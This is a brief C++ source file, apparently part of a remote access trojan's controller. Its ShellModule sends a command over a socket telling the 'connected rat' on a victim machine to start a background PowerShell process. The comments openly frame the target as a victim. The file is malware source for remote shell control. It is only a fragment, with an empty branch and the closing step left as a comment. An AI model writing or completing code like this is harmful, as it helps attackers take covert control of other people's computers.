#include <modules.hpp>

Module::Module(){}

ShellModule::ShellModule(){}
ShellModule& ShellModule::getInstance() {
    static ShellModule instance;
    return instance;
}

void ShellModule::execute(const SOCKET& sock) {
    if (sock == INVALID_SOCKET) {
        std::cerr << "[-] Module Socket target is not Valid!" << "\n";
        return;
    }

    std::cout << "[*] Starting up Shell Module. . ." << std::endl;
    // tell the connected rat to create/hook into a background powershell process
    std::string victProcCmd = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    if (RatPacketUtils::Send(sock, RatPacket(victProcCmd, MsgType::INVOKE))) {

    }
    // kill powershell background process
    std::cout << "[*] Closing Shell Module. . ." << std::endl;
}